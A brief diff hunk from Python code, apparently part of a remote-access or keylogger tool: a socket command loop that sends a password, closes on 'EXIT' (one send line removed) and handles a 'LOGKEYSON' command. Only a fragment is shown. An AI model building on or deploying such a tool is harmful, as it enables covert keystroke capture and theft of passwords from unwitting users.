@@ -35,7 +35,6 @@ def runShell(socketHolder):
 			else:
 				socketHolder.send(password)
 		elif data == "EXIT":
-			socketHolder.send('EXIT')
 			socketHolder.close()
 			sys.exit(0)
 		elif data == "LOGKEYSON":
